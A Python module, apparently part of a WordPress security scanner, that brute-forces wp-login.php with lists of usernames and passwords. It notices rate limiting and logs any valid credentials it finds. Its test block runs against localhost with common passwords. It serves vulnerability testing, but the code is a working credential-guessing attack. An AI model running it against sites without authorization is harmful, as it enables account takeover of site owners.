"""
Module for detecting WordPress brute-force login vulnerabilities.
"""

import requests
from time import sleep
from typing import List, Dict, Optional, Tuple
import re
from src.utils.logger_config import logger

def detect_bruteforce(
    target_url: str,
    usernames: List[str],
    passwords: List[str],
    delay: int = 1,
    max_attempts: Optional[int] = None
) -> Tuple[bool, List[str], List[Dict[str, str]]]:
    """
    Detects WordPress login vulnerabilities by attempting brute force login attempts.
    
    Args:
        target_url (str): Target WordPress URL
        usernames (List[str]): List of usernames to test
        passwords (List[str]): List of passwords to test
        delay (int): Delay in seconds between attempts (default: 1)
        max_attempts (Optional[int]): Maximum number of attempts before stopping (None for unlimited)
    
    Returns:
        Tuple[bool, List[str], List[Dict[str, str]]]:
            - bool: Whether brute-force vulnerability was detected
            - List[str]: List of usernames that were tested
            - List[Dict[str, str]]: List of dictionaries containing successful login credentials
    """
    detected = False
    usernames_tested = []
    credentials_found = []
    
    logger.info(f"Starting brute force detection for {target_url}")
    logger.debug(f"Parameters: delay={delay}, max_attempts={max_attempts}")
    logger.debug(f"Testing {len(usernames)} usernames and {len(passwords)} passwords")
    
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    attempt_count = 0
    rate_limited = False
    
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; WP-BruteForce/1.0)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    
    # Success indicators
    success_indicators = [
        r"wp-admin",
        r"dashboard",
        r"welcome",
        r"logout",
        r"profile",
        r"wordpress.*admin",
        r"wordpress.*dashboard"
    ]
    
    # Rate limiting indicators
    rate_limit_indicators = [
        r"too many attempts",
        r"rate limit",
        r"please try again later",
        r"temporarily blocked",
        r"access denied"
    ]
    
    for username in usernames:
        if rate_limited:
            logger.warning("Rate limiting detected. Stopping brute force attempts.")
            break
            
        for password in passwords:
            # Check if we've reached the maximum attempts
            if max_attempts is not None and attempt_count >= max_attempts:
                logger.info(f"Reached maximum attempts ({max_attempts}). Stopping.")
                return detected, usernames_tested, credentials_found
            
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'{target_url}/wp-admin/',
                'testcookie': 1
            }
            
            try:
                logger.debug(f"Attempt {attempt_count + 1}: Testing {username}:{password}")
                response = requests.post(login_url, data=data, headers=headers, timeout=5)
                attempt_count += 1
                
                # Track tested usernames
                if username not in usernames_tested:
                    usernames_tested.append(username)
                
                # Check for rate limiting
                if (response.status_code in [429, 403] or 
                    any(re.search(pattern, response.text.lower()) for pattern in rate_limit_indicators)):
                    logger.warning("Rate limiting detected!")
                    logger.debug(f"Status code: {response.status_code}")
                    logger.info("Consider increasing the delay parameter")
                    rate_limited = True
                    break
                
                # Check for successful login
                if (any(re.search(pattern, response.url.lower()) for pattern in success_indicators) or
                    any(re.search(pattern, response.text.lower()) for pattern in success_indicators)):
                    detected = True
                    credentials = {"username": username, "password": password}
                    credentials_found.append(credentials)
                    logger.warning(f"Valid credentials found: {username}:{password}")
                    logger.debug(f"Attempt {attempt_count}: Success")
                else:
                    logger.debug(f"Attempt {attempt_count}: Failed - {username}:{password}")
                
            except requests.exceptions.RequestException as e:
                logger.error(f"Network error: {e}")
                logger.debug("Continuing with next attempt")
                continue
            
            # Add delay between attempts
            sleep(delay)
    
    if detected:
        logger.warning(f"Brute force vulnerability detected! Found {len(credentials_found)} valid credentials")
    else:
        logger.info("No brute force vulnerability detected")
    
    return detected, usernames_tested, credentials_found

# Test block
if __name__ == "__main__":
    # Example usage
    url = "http://localhost:8080"  # Change this to your target URL
    test_usernames = ["admin", "test"]
    test_passwords = ["password", "admin123", "test123"]
    
    logger.info("Starting brute force test...")
    detected, tested_users, found_creds = detect_bruteforce(
        target_url=url,
        usernames=test_usernames,
        passwords=test_passwords,
        delay=1,
        max_attempts=10
    )
    
    print(f"Brute force detected: {detected}")
    print(f"Usernames tested: {tested_users}")
    print(f"Credentials found: {found_creds}") 